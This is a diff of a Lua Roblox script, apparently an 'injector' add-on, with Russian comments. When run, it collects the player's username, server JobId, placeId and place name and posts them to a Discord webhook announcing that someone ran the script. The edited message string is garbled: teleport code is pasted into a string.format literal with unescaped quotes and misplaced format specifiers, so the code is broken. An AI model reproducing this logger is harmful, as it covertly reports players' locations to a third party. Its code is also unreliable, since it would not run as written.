@@ -47,14 +47,20 @@ local function getPlayerData()
     }
 end
 
--- Функция для генерации скрипта телепортации
-local function generateTeleportScript(playerData)
-    if not playerData.placeId or not playerData.serverId then
-        return "[ERROR] Отсутствуют необходимые данные (placeId или serverId)"
+-- Функция для отправки сообщения в Discord
+local function sendWebhookMessage()
+    debugPrint("Начало отправки сообщения в Discord...")
+
+    -- Собираем данные игрока
+    local playerData = getPlayerData()
+    if not playerData then
+        debugPrint("Не удалось собрать данные игрока!")
+        return
     end
 
-    return string.format([[
-local TeleportService = game:GetService("TeleportService")
+    -- Формируем сообщение
+    local message = string.format(
+        "Скрипт активирован!\nНик игрока: %s\nlocal TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
 
 -- Функция для отладки
@@ -63,8 +69,8 @@ local function debugPrint(message)
 end
 
 -- Параметры телепортации
-local placeId = %d -- PlaceId: %s
-local jobId = "%s" -- ServerId
+local jobId = "%s\n" -- Замените на JobId целевого сервера
+local placeId = 0 -- Замените на PlaceId целевой игры
 
 -- Функция для телепортации
 local function teleportToPlaceAndServer()
@@ -106,42 +112,16 @@ debugPrint("Скрипт запущен!")
 teleportToPlaceAndServer()
 
 -- Защита от мгновенного отключения
-task.wait(5) -- Ждём 5 секунд, чтобы избежать отключения до завершения телепортации
-]], 
-        playerData.placeId, 
-        playerData.placeName or "Unknown Place",
-        playerData.serverId
-    )
-end
-
--- Функция для отправки сообщения в Discord
-local function sendWebhookMessage()
-    debugPrint("Начало отправки сообщения в Discord...")
-
-    -- Собираем данные игрока
-    local playerData = getPlayerData()
-    if not playerData then
-        debugPrint("Не удалось собрать данные игрока!")
-        return
-    end
-
-    -- Генерируем скрипт телепортации
-    local teleportScript = generateTeleportScript(playerData)
-    if teleportScript:find("[ERROR]") then
-        debugPrint("Ошибка при генерации скрипта: " .. teleportScript)
-        return
-    end
-
-    -- Формируем сообщение для Discord
-    local message = string.format(
-        "Скрипт активирован!\nНик игрока: %s\n\n```lua\n%s\n```",
-        playerData.username or "Unknown Player",
-        teleportScript
+task.wait(5) -- Ждём 5 секунд, чтобы избежать отключения до завершения телепортации%d\nНазвание плейса: %s",
+        playerData.username,
+        playerData.serverId,
+        playerData.placeId,
+        playerData.placeName
     )
 
     local data = {
         ["content"] = message,
-        ["username"] = "Roblox Injector Bot",
+        ["username"] = "КТО-ТО ЗАПУСТИЛ СКРИПТ",
         ["avatar_url"] = "https://i.imgur.com/4Kuye6W.jpeg"
     }
 
